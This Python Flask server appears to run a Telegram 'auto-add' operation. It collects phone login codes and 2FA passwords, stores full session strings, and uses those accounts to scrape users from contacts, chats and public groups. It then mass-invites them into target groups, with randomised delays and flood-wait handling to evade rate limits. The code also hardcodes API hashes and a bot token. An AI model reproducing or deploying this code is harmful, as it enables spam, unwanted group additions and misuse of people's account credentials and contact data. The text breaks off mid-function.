#!/usr/bin/env python3
"""
Telegram Auto-Add Server - ENHANCED STABLE VERSION
Each server uses its own unique API credentials
Enhanced with robust error handling and crash prevention
"""

from flask import Flask, jsonify, request, redirect, send_file
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
from collections import defaultdict
import traceback
import sys
import signal
from functools import wraps

# Configure logging with rotation
import logging.handlers

# Create logs directory if it doesn't exist
os.makedirs('logs', exist_ok=True)

# Set up rotating file handler
file_handler = logging.handlers.RotatingFileHandler(
    'logs/server.log',
    maxBytes=10*1024*1024,  # 10MB
    backupCount=5
)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder=None)
CORS(app)

# ============================================
# SERVER CONFIGURATION - CHANGE THIS NUMBER
# ============================================
SERVER_NUMBER = 4  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 37539842, 'api_hash': 'a9927e01c5023bf828fe753895d5731b', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUPS = ['Abe_armygroup', 'abe_army']

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# File paths
ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'
WORKER_ADDS_FILE = 'worker_adds.json'
TEMP_SESSIONS_FILE = 'temp_sessions.json'
ERROR_LOG_FILE = 'logs/errors.log'

# Storage with thread locks
accounts = []
temp_sessions = {}
auto_add_settings = {}
running_tasks = {}
worker_adds = defaultdict(list)
file_lock = threading.Lock()
worker_lock = threading.Lock()

stats = {
    'total_added': 0,
    'today_added': 0,
    'verified_total': 0,
    'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'worker_stats': {},
    'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat(),
    'crashes_recovered': 0
}

# ============================================
# ERROR HANDLING DECORATORS
# ============================================
def safe_operation(func):
    """Decorator to catch and log exceptions"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"Error in {func.__name__}: {e}")
            logger.error(traceback.format_exc())
            log_error(f"Function: {func.__name__}", e)
            return None
    return wrapper

def api_error_handler(func):
    """Decorator for API routes to handle errors"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            error_msg = f"API Error in {func.__name__}: {e}"
            logger.error(error_msg)
            logger.error(traceback.format_exc())
            log_error(f"API: {func.__name__}", e)
            return jsonify({
                'success': False,
                'error': 'Internal server error. Please try again.',
                'error_code': 'INTERNAL_ERROR'
            }), 500
    return wrapper

def log_error(context, exception):
    """Log errors to separate error log file"""
    try:
        timestamp = datetime.now().isoformat()
        error_entry = f"[{timestamp}] {context}\n{str(exception)}\n{traceback.format_exc()}\n{'='*50}\n"
        with open(ERROR_LOG_FILE, 'a') as f:
            f.write(error_entry)
    except:
        pass

# ============================================
# FILE OPERATIONS WITH ENHANCED SAFETY
# ============================================
@safe_operation
def load_json(path, default):
    """Load JSON with backup and corruption recovery"""
    try:
        if os.path.exists(path):
            # Try to load backup if main file is corrupted
            with open(path, 'r') as f:
                content = f.read().strip()
                if content:
                    data = json.loads(content)
                    # Create backup
                    backup_path = f"{path}.backup"
                    with open(backup_path, 'w') as backup:
                        json.dump(data, backup, indent=2, default=str)
                    return data
    except json.JSONDecodeError as e:
        logger.error(f"Corrupted JSON file {path}: {e}")
        # Try to restore from backup
        backup_path = f"{path}.backup"
        if os.path.exists(backup_path):
            try:
                with open(backup_path, 'r') as backup:
                    restored_data = json.load(backup)
                    logger.info(f"Restored {path} from backup")
                    return restored_data
            except:
                pass
        # If backup also fails, create fresh file
        logger.warning(f"Creating fresh {path}")
        save_json(path, default)
    except Exception as e:
        logger.error(f"Load error {path}: {e}")
        log_error(f"File load: {path}", e)
    return default

@safe_operation
def save_json(path, data):
    """Save JSON with atomic write to prevent corruption"""
    temp_path = f"{path}.tmp"
    with file_lock:
        try:
            # Write to temporary file first
            with open(temp_path, 'w') as f:
                json.dump(data, f, indent=2, default=str)
            # Atomic rename
            os.replace(temp_path, path)
        except Exception as e:
            logger.error(f"Save error {path}: {e}")
            log_error(f"File save: {path}", e)
            # Try direct write as fallback
            try:
                with open(path, 'w') as f:
                    json.dump(data, f, indent=2, default=str)
            except:
                pass

def save_temp_sessions():
    sessions_data = {}
    for session_id, session_data in temp_sessions.items():
        sessions_data[session_id] = {
            'phone': session_data['phone'],
            'hash': session_data['hash'],
            'session': session_data['session'],
            'password_attempts': session_data.get('password_attempts', 0),
            'code_attempts': session_data.get('code_attempts', 0),
            'created_at': session_data.get('created_at', time.time())
        }
    save_json(TEMP_SESSIONS_FILE, sessions_data)

def load_temp_sessions():
    global temp_sessions
    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
    temp_sessions = {}
    current_time = time.time()
    for session_id, session_data in sessions_data.items():
        created_at = session_data.get('created_at', 0)
        if current_time - created_at < 3600:  # 1 hour expiry
            temp_sessions[session_id] = session_data

# ============================================
# ENHANCED TELEGRAM CLIENT HELPER
# ============================================
class SyncTelegramClient:
    @staticmethod
    def run_async(async_func, timeout=60, retries=2):
        """Enhanced async execution with retry logic"""
        for attempt in range(retries + 1):
            loop = None
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(
                    asyncio.wait_for(async_func(), timeout=timeout)
                )
                return result
            except asyncio.TimeoutError:
                logger.warning(f"Async timeout on attempt {attempt + 1}")
                if attempt == retries:
                    raise
            except Exception as e:
                logger.error(f"Async execution error (attempt {attempt + 1}): {e}")
                log_error("Async execution", e)
                if attempt == retries:
                    raise
                time.sleep(1 * (attempt + 1))  # Progressive delay
            finally:
                if loop:
                    try:
                        loop.close()
                    except:
                        pass
    
    @staticmethod
    def get_client(session_string):
        """Create Telegram client with better error recovery"""
        try:
            return TelegramClient(
                StringSession(session_string), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=2,
                timeout=30,
                auto_reconnect=True,
                loop=asyncio.new_event_loop()
            )
        except Exception as e:
            logger.error(f"Failed to create client: {e}")
            log_error("Client creation", e)
            raise
    
    @staticmethod
    async def safe_connect(client):
        """Safe connection with timeout and error handling"""
        try:
            await asyncio.wait_for(client.connect(), timeout=15)
            return True
        except asyncio.TimeoutError:
            logger.error("Client connection timeout")
            return False
        except ConnectionError as e:
            logger.error(f"Connection error: {e}")
            return False
        except Exception as e:
            logger.error(f"Client connection error: {e}")
            return False

# ============================================
# ACCOUNT AGE DETECTION
# ============================================
def get_account_age_sync(session_string):
    async def _get_age():
        client = SyncTelegramClient.get_client(session_string)
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return {'age_display': 'Unknown', 'method': 'connection_failed'}
            
            if not await client.is_user_authorized():
                return {'age_display': 'Unknown', 'method': 'not_authorized'}
            
            me = await client.get_me()
            
            if hasattr(me, 'creation_date') and me.creation_date:
                creation_date = me.creation_date
                if hasattr(creation_date, 'tzinfo') and creation_date.tzinfo:
                    creation_date = creation_date.replace(tzinfo=None)
                age_days = (datetime.now() - creation_date).days
                age_years = age_days / 365.25
                return {
                    'creation_date': creation_date.isoformat(),
                    'age_days': age_days,
                    'age_years': round(age_years, 1),
                    'age_display': f"{int(age_years)} years, {age_days % 365} days",
                    'year_joined': creation_date.year,
                    'method': 'creation_date'
                }
            
            try:
                photos = await client.get_profile_photos(me, limit=1)
                if photos and len(photos) > 0:
                    oldest_photo_date = photos[0].date
                    if hasattr(oldest_photo_date, 'tzinfo') and oldest_photo_date.tzinfo:
                        oldest_photo_date = oldest_photo_date.replace(tzinfo=None)
                    age_days = (datetime.now() - oldest_photo_date).days
                    return {
                        'creation_date': oldest_photo_date.isoformat(),
                        'age_days': age_days,
                        'age_years': round(age_days / 365.25, 1),
                        'age_display': f"~{int(age_days / 365.25)} years",
                        'year_joined': oldest_photo_date.year,
                        'method': 'oldest_photo'
                    }
            except:
                pass
            
            return {'age_display': 'Unknown account age', 'method': 'unknown'}
        except Exception as e:
            logger.error(f"Age detection error: {e}")
            log_error("Age detection", e)
            return {'age_display': 'Error', 'method': 'error', 'error': str(e)}
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    try:
        return SyncTelegramClient.run_async(_get_age, timeout=20)
    except Exception as e:
        logger.error(f"Age detection failed: {e}")
        return {'age_display': 'Unknown', 'method': 'error', 'error': str(e)}

# ============================================
# ENHANCED ACCOUNT MANAGEMENT
# ============================================
def reset_daily():
    """Reset daily stats with error handling"""
    try:
        today = datetime.now().strftime('%Y-%m-%d')
        if stats.get('last_reset') != today:
            stats['today_added'] = 0
            stats['verified_today'] = 0
            stats['last_reset'] = today
            for k in stats.get('worker_stats', {}):
                stats['worker_stats'][k]['today'] = 0
                stats['worker_stats'][k]['verified_today'] = 0
            save_json(STATS_FILE, stats)
    except Exception as e:
        logger.error(f"Reset daily error: {e}")

def check_account_auth(acc, max_retries=2):
    """Check account authorization with retry logic"""
    async def _check():
        client = SyncTelegramClient.get_client(acc['session'])
        try:
            if not await SyncTelegramClient.safe_connect(client):
                return False
            return await client.is_user_authorized()
        except:
            return False
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    for attempt in range(max_retries):
        try:
            result = SyncTelegramClient.run_async(_check, timeout=15)
            if result is not None:
                return result
        except:
            if attempt == max_retries - 1:
                return False
            time.sleep(1)
    return False

def remove_dead_account(aid, reason=""):
    """Remove dead account with safety checks"""
    global accounts
    try:
        acc = next((a for a in accounts if a['id'] == aid), None)
        name = acc.get('name', str(aid)) if acc else str(aid)
        
        with worker_lock:
            accounts = [a for a in accounts if a['id'] != aid]
            auto_add_settings.pop(str(aid), None)
            if str(aid) in running_tasks:
                worker_info = running_tasks.pop(str(aid), None)
                if worker_info and hasattr(worker_info.get('worker'), 'stop'):
                    try:
                        worker_info['worker'].stop()
                    except:
                        pass
            worker_adds.pop(str(aid), None)
        
        save_json(ACCOUNTS_FILE, accounts)
        save_json(SETTINGS_FILE, auto_add_settings)
        save_json(WORKER_ADDS_FILE, dict(worker_adds))
        
        stats['dead_accounts_removed'] = stats.get('dead_accounts_removed', 0) + 1
        save_json(STATS_FILE, stats)
        
        logger.warning(f"Removed dead account: {name} | Reason: {reason}")
        try:
            send_telegram(f"<b>{SERVER_NAME}</b>\n❌ Removed: {name}\nReason: {reason}")
        except:
            pass
        return name
    except Exception as e:
        logger.error(f"Remove account error: {e}")
        log_error("Remove account", e)
        return "Unknown"

def send_telegram(text, retries=3):
    """Send telegram message with retry logic"""
    for attempt in range(retries):
        try:
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                json={'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'},
                timeout=10
            )
            if response.status_code == 200:
                return True
            logger.warning(f"Telegram send failed with status {response.status_code}")
        except Exception as e:
            logger.error(f"Send telegram error (attempt {attempt + 1}): {e}")
        if attempt < retries - 1:
            time.sleep(2)
    return False

# ============================================
# ENHANCED AUTO-ADD WORKER
# ============================================
class AutoAddWorker:
    def __init__(self, account):
        self.account = account
        self.acc_id = account['id']
        self.acc_key = str(self.acc_id)
        self.running = True
        self.client = None
        self.last_ping = time.time()
        self.consecutive_errors = 0
        self.max_consecutive_errors = 10
        self.last_activity = time.time()
        self.health_check_interval = 300  # 5 minutes
        self.last_health_check = time.time()
    
    def stop(self):
        self.running = False
        self.disconnect_client()
    
    def disconnect_client(self):
        """Safely disconnect client"""
        if self.client:
            try:
                async def _disconnect():
                    await self.client.disconnect()
                SyncTelegramClient.run_async(_disconnect, timeout=5)
            except:
                pass
            finally:
                self.client = None
    
    def run(self):
        """Main worker loop with enhanced error recovery"""
        logger.info(f"Auto-add worker started for account {self.account.get('name', self.acc_id)}")
        
        try:
            self.join_all_targets()
        except Exception as e:
            logger.error(f"Initial join targets failed: {e}")
        
        attempted_users = set()
        cycle_count = 0
        
        while self.running:
            try:
                # Health check for worker
                if time.time() - self.last_health_check > self.health_check_interval:
                    self.perform_health_check()
                    self.last_health_check = time.time()
                
                # Reset consecutive errors on successful cycle
                self.consecutive_errors = 0
                
                settings = auto_add_settings.get(self.acc_key, {})
                if not settings.get('enabled', True):
                    self.last_activity = time.time()
                    time.sleep(5)
                    continue
                
                reset_daily()
                
                # Ensure connection before processing
                if not self.ensure_connection():
                    self.consecutive_errors += 1
                    if self.consecutive_errors >= self.max_consecutive_errors:
                        logger.error(f"Worker {self.acc_key}: Too many connection failures, restarting...")
                        self.reconnect()
                        self.consecutive_errors = 0
                    time.sleep(30)
                    continue
                
                user_ids = self.get_user_sources()
                if not user_ids:
                    logger.debug(f"Worker {self.acc_key}: No user sources found, waiting...")
                    self.last_activity = time.time()
                    time.sleep(60)
                    continue
                
                logger.info(f"Worker {self.acc_key}: Found {len(user_ids)} unique users")
                
                # Manage attempted users memory
                if len(attempted_users) > 10000:  # Limit memory usage
                    attempted_users.clear()
                
                fresh_users = [uid for uid in user_ids if uid not in attempted_users]
                if len(fresh_users) < 50:
                    attempted_users.clear()
                    fresh_users = list(user_ids)
                
                random.shuffle(fresh_users)
                delay = max(30, settings.get('delay_seconds', 30))  # Increased minimum delay
                added_count = 0
                
                for user_id in fresh_users[:100]:  # Reduced batch size for stability
                    if not self.running:
                        break
                    
                    settings_check = auto_add_settings.get(self.acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted_users.add(user_id)
                    
                    try:
                        if self.add_user_to_targets(user_id):
                            added_count += 1
                            stats['today_added'] = stats.get('today_added', 0) + 1
                            stats['total_added'] = stats.get('total_added', 0) + 1
                            
                            if self.acc_key not in stats['worker_stats']:
                                stats['worker_stats'][self.acc_key] = {'total': 0, 'today': 0, 'verified_today': 0}
                            stats['worker_stats'][self.acc_key]['today'] += 1
                            stats['worker_stats'][self.acc_key]['total'] += 1
                            
                            # Save stats periodically
                            if added_count % 10 == 0:
                                save_json(STATS_FILE, stats)
                    except Exception as e:
                        logger.error(f"Add user error: {e}")
                        self.consecutive_errors += 1
                        if self.consecutive_errors >= self.max_consecutive_errors:
                            break
                    
                    actual_delay = random.uniform(delay * 0.9, delay * 1.3)  # More variation
                    self.last_activity = time.time()
                    time.sleep(actual_delay)
                    
                    # Periodic reconnect to maintain freshness
                    if added_count > 0 and added_count % 30 == 0:
                        self.reconnect()
                
                cycle_count += 1
                logger.info(f"Cycle {cycle_count}: Added {added_count} users | Today: {stats['today_added']}")
                
                # Save stats after each cycle
                save_json(STATS_FILE, stats)
                
                # Rest between cycles with activity check
                rest_time = random.randint(60, 120)
                for _ in range(rest_time):
                    if not self.running:
                        break
                    self.last_activity = time.time()
                    time.sleep(1)
                
            except Exception as e:
                logger.error(f"Worker error (cycle): {e}")
                log_error(f"Worker {self.acc_key}", e)
                self.consecutive_errors += 1
                
                if self.consecutive_errors >= self.max_consecutive_errors:
                    logger.critical(f"Worker {self.acc_key}: Too many errors, stopping worker")
                    self.running = False
                    break
                
                time.sleep(30)
                self.reconnect()
    
    def perform_health_check(self):
        """Perform worker health check"""
        try:
            # Check if worker is stuck
            if time.time() - self.last_activity > 600:  # 10 minutes no activity
                logger.warning(f"Worker {self.acc_key}: Inactive for too long, reconnecting...")
                self.reconnect()
                self.last_activity = time.time()
            
            # Check connection health
            if not self.ensure_connection():
                logger.warning(f"Worker {self.acc_key}: Connection unhealthy, reconnecting...")
                self.reconnect()
        except Exception as e:
            logger.error(f"Health check error: {e}")
    
    def ensure_connection(self):
        """Enhanced connection management"""
        try:
            if self.client and hasattr(self.client, 'is_connected'):
                try:
                    if self.client.is_connected():
                        # Periodic ping to keep connection alive
                        if time.time() - self.last_ping > 60:
                            async def ping():
                                try:
                                    await self.client.get_me()
                                    return True
                                except:
                                    return False
                            if SyncTelegramClient.run_async(ping, timeout=10):
                                self.last_ping = time.time()
                                return True
                            else:
                                logger.warning(f"Worker {self.acc_key}: Ping failed, reconnecting...")
                                return self.reconnect()
                        return True
                except:
                    pass
            return self.connect_client()
        except Exception as e:
            logger.error(f"Ensure connection error: {e}")
            return self.reconnect()
    
    def connect_client(self):
        """Connect client with retry logic"""
        for attempt in range(3):
            try:
                self.disconnect_client()  # Clean existing connection
                self.client = SyncTelegramClient.get_client(self.account['session'])
                
                async def _connect():
                    if not await SyncTelegramClient.safe_connect(self.client):
                        return False
                    return await self.client.is_user_authorized()
                
                result = SyncTelegramClient.run_async(_connect, timeout=20)
                if result:
                    self.last_ping = time.time()
                    self.last_activity = time.time()
                    return True
                
                logger.warning(f"Connect attempt {attempt + 1} failed for worker {self.acc_key}")
            except Exception as e:
                logger.error(f"Connect error (attempt {attempt + 1}): {e}")
                log_error(f"Worker connect {self.acc_key}", e)
            
            if attempt < 2:  # Don't sleep on last attempt
                time.sleep(min(5 * (attempt + 1), 15))
        
        return False
    
    def reconnect(self):
        """Enhanced reconnection with error handling"""
        try:
            self.disconnect_client()
            time.sleep(2)
            return self.connect_client()
        except Exception as e:
            logger.error(f"Reconnect error: {e}")
            return False
    
    def join_all_targets(self):
        """Join all target groups with retry logic"""
        for target in TARGET_GROUPS:
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    if not self.ensure_connection():
                        time.sleep(5)
                        continue
                    
                    async def _join():
                        try:
                            entity = await self.client.get_entity(target)
                            await self.client(JoinChannelRequest(entity))
                            return True
                        except errors.FloodWaitError as e:
                            wait_time = min(e.seconds, 120)
                            logger.warning(f"Flood wait {wait_time}s for join {target}")
                            time.sleep(wait_time)
                            return False
                        except Exception as e:
                            if 'already' in str(e).lower() or 'participant' in str(e).lower():
                                return True
                            logger.warning(f"Join {target} error (attempt {attempt + 1}): {e}")
                            return False
                    
                    if SyncTelegramClient.run_async(_join, timeout=30):
                        logger.info(f"Joined {target}")
                        break
                except Exception as e:
                    logger.warning(f"Join target {target} failed: {e}")
                time.sleep(min(5 * (attempt + 1), 20))
    
    def get_user_sources(self):
        """Get user sources with enhanced error recovery"""
        user_ids = set()
        
        if not self.ensure_connection():
            return user_ids
        
        async def _collect():
            try:
                # Collect from contacts with error handling
                try:
                    contacts = await self.client(GetContactsRequest(0))
                    for user in contacts.users:
                        if user.id and not getattr(user, 'bot', False):
                            user_ids.add(user.id)
                except Exception as e:
                    logger.debug(f"Contact collection error: {e}")
                
                # Collect from dialogs with error handling
                try:
                    dialogs = await self.client.get_dialogs(limit=100)
                    for d in dialogs:
                        if d.is_user and d.entity and d.entity.id:
                            if not getattr(d.entity, 'bot', False):
                                user_ids.add(d.entity.id)
                except Exception as e:
                    logger.debug(f"Dialog collection error: {e}")
                
                # Collect from source groups with rate limiting
                source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest',
                               '@TelegramNews', '@builders', '@Android', '@iOS',
                               '@Python', '@programming', '@abe_army']
                
                for sg in source_groups:
                    try:
                        entity = await self.client.get_entity(sg)
                        participants = await self.client.get_participants(entity, limit=100)
                        for user in participants:
                            if user.id and not getattr(user, 'bot', False):
                                user_ids.add(user.id)
                        await asyncio.sleep(0.5)  # Rate limiting
                    except Exception as e:
                        logger.debug(f"Group {sg} collection error: {e}")
                        continue
                
                return list(user_ids)
            except Exception as e:
                logger.error(f"Collection error: {e}")
                log_error("User collection", e)
                return []
        
        try:
            return SyncTelegramClient.run_async(_collect, timeout=45)
        except Exception as e:
            logger.error(f"Get user sources error: {e}")
            return []
    
    def add_user_to_targets(self, user_id):
        """Add user to targets with enhanced error handling"""
        success = False
        
        async def _add_to_target(target):
            try:
                entity = await self.client.get_entity(target)
                user_input = await self.client.get_input_entity(user_id)
                await self.client(InviteToChannelRequest(entity, [user_input]))
                return True
            except errors.FloodWaitError as e:
                wait_time = min(e.seconds, 60)
                logger.warning(f"Flood wait {wait_time}s")
                time.sleep(wait_time)
                return False
            except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
                    errors.UserAlreadyParticipantError, errors.UserKickedError,
                    errors.UserBannedInChannelError, errors.UserDeactivatedBanError):
                return False
            except errors.rpcerrorlist.AuthKeyUnregisteredError:
                logger.error("Auth key unregistered - stopping worker")
                self.running = False
                raise  # Re-raise to be caught by outer handler
            except Exception as e:
                logger.debug(f"Add to {target} error: {e}")
                return False
        
        for target in TARGET_GROUPS:
            if not self.running:
                break
            if not self.ensure_connection():
                break
            try:
                if SyncTelegramClient.run_async(lambda: _add_to_target(target), timeout=15):
                    success = True
            except Exception as e:
                logger.error(f"Add to target {target} failed: {e}")
                continue
        
        if success:
            try:
                record = {
                    'user_id': user_id,
                    'time': datetime.now().isoformat(),
                    'worker_id': self.acc_id
                }
                worker_adds[self.acc_key].append(record)
                if len(worker_adds[self.acc_key]) > 1000:
                    worker_adds[self.acc_key] = worker_adds[self.acc_key][-1000:]
                if len(worker_adds[self.acc_key]) % 10 == 0:  # Save periodically
                    save_json(WORKER_ADDS_FILE, dict(worker_adds))
            except Exception as e:
                logger.error(f"Record add error: {e}")
        
        return success

def start_auto_add(account):
    """Start auto-add worker with error handling"""
    acc_key = str(account['id'])
    with worker_lock:
        try:
            if acc_key in running_tasks:
                existing = running_tasks[acc_key]
                if existing and existing.get('thread') and existing['thread'].is_alive():
                    logger.info(f"Worker already running for {account.get('name', acc_key)}")
                    return
            
            worker = AutoAddWorker(account)
            thread = threading.Thread(target=worker.run, daemon=True, name=f"worker_{acc_key}")
            thread.start()
            running_tasks[acc_key] = {'thread': thread, 'worker': worker}
            logger.info(f"Started worker for {account.get('name', acc_key)}")
        except Exception as e:
            logger.error(f"Start worker error: {e}")
            log_error(f"Start worker {acc_key}", e)

def stop_auto_add(account_id):
    """Stop auto-add worker with error handling"""
    acc_key = str(account_id)
    with worker_lock:
        try:
            if acc_key in running_tasks:
                worker_info = running_tasks[acc_key]
                if worker_info and worker_info.get('worker'):
                    try:
                        worker_info['worker'].stop()
                    except Exception as e:
                        logger.error(f"Stop worker error: {e}")
                running_tasks.pop(acc_key, None)
                logger.info(f"Stopped worker for account {acc_key}")
        except Exception as e:
            logger.error(f"Stop auto add error: {e}")

# ============================================
# FLASK ROUTES WITH ENHANCED ERROR HANDLING
# ============================================

@app.errorhandler(404)
def not_found(e):
    return jsonify({'success': False, 'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(e):
    log_error("Server error 500", e)
    return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.route('/')
def index():
    try:
        return redirect('/auto-add')
    except Exception as e:
        logger.error(f"Index redirect error: {e}")
        return jsonify({'success': False, 'error': 'Server error'}), 500

@app.route('/auto-add')
def auto_add_page():
    try:
        return send_file('auto_add.html')
    except FileNotFoundError:
        return "auto_add.html not found", 404
    except Exception as e:
        logger.error(f"Auto add page error: {e}")
        return "Internal server error", 500

@app.route('/login')
def login_page():
    try:
        return send_file('login.html')
    except FileNotFoundError:
        return "login.html not found", 404
    except Exception as e:
        logger.error(f"Login page error: {e}")
        return "Internal server error", 500

@app.route('/dashboard')
def dashboard_page():
    try:
        return send_file('dashboard.html')
    except FileNotFoundError:
        return "dashboard.html not found", 404
    except Exception as e:
        logger.error(f"Dashboard page error: {e}")
        return "Internal server error", 500

@app.route('/dash')
def dash_page():
    try:
        return send_file('dash.html')
    except FileNotFoundError:
        return "dash.html not found", 404
    except Exception as e:
        logger.error(f"Dash page error: {e}")
        return "Internal server error", 500

@app.route('/all')
def all_page():
    try:
        return send_file('all.html')
    except FileNotFoundError:
        return "all.html not found", 404
    except Exception as e:
        logger.error(f"All page error: {e}")
        return "Internal server error", 500

@app.route('/ping')
@api_error_handler
def ping():
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'api_id': API_ID,
        'timestamp': datetime.now().isoformat(),
        'workers': len(running_tasks),
        'uptime': str(datetime.now() - datetime.fromisoformat(stats['started_at']))
    })

@app.route('/api/server-info')
@api_error_handler
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_groups': TARGET_GROUPS,
            'api_id': API_ID,
            'port': PORT,
            'workers_active': len(running_tasks),
            'total_accounts': len(accounts),
            'uptime': str(datetime.now() - datetime.fromisoformat(stats['started_at']))
        }
    })

@app.route('/api/accounts')
@api_error_handler
def get_accounts():
    acc_list = []
    for a in accounts:
        try:
            aid_str = str(a['id'])
            ws = stats.get('worker_stats', {}).get(aid_str, {})
            account_age = a.get('account_age', {})
            
            acc_list.append({
                'id': a['id'],
                'name': a.get('name', '?'),
                'phone': a.get('phone', ''),
                'username': a.get('username', ''),
                'active': a.get('active', True),
                'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
                'account_age': account_age,
                'stats': {
                    'total_added': ws.get('total', 0),
                    'today_added': ws.get('today', 0)
                },
                'is_running': aid_str in running_tasks
            })
        except Exception as e:
            logger.error(f"Account listing error for {a.get('id')}: {e}")
            continue
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/add-account', methods=['POST'])
@api_error_handler
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Sending code to {phone}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time() * 1000))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save(),
                    'password_attempts': 0,
                    'code_attempts': 0,
                    'created_at': time.time()
                }
                save_temp_sessions()
                return {'success': True, 'session_id': sid}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except Exception as e:
                logger.error(f"Send code error: {e}")
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(send_code, timeout=45)
        return jsonify(result)
    except Exception as e:
        logger.error(f"Add account error: {e}")
        return jsonify({'success': False, 'error': 'Server error. Please try again.'})

@app.route('/api/verify-code', methods=['POST'])
@api_error_handler
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
        
        td = temp_sessions[sid]
        
        if td.get('code_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect code attempts. Session expired.'})
        
        if td.get('password_attempts', 0) >= 5:
            del temp_sessions[sid]
            save_temp_sessions()
            return jsonify({'success': False, 'error': 'Too many incorrect password attempts. Session expired.'})
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                    td['code_attempts'] = 0
                    save_temp_sessions()
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    try:
                        await client.sign_in(password=pwd)
                        td['password_attempts'] = 0
                        save_temp_sessions()
                    except errors.PasswordHashInvalidError:
                        td['password_attempts'] = td.get('password_attempts', 0) + 1
                        save_temp_sessions()
                        remaining = 5 - td['password_attempts']
                        if remaining <= 0:
                            del temp_sessions[sid]
                            save_temp_sessions()
                            return {'success': False, 'error': 'Too many incorrect passwords. Session expired.'}
                        return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
                
                me = await client.get_me()
                
                # Get account age with timeout
                try:
                    account_age = get_account_age_sync(client.session.save())
                except:
                    account_age = {'age_display': 'Unknown'}
                
                new_id = int(time.time() * 1000)
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'account_age': account_age
                }
                
                if not new_acc['name']:
                    new_acc['name'] = 'User'
                
                accounts.append(new_acc)
                save_json(ACCOUNTS_FILE, accounts)
                
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUPS[0],
                    'delay_seconds': 30,
                    'auto_join': True
                }
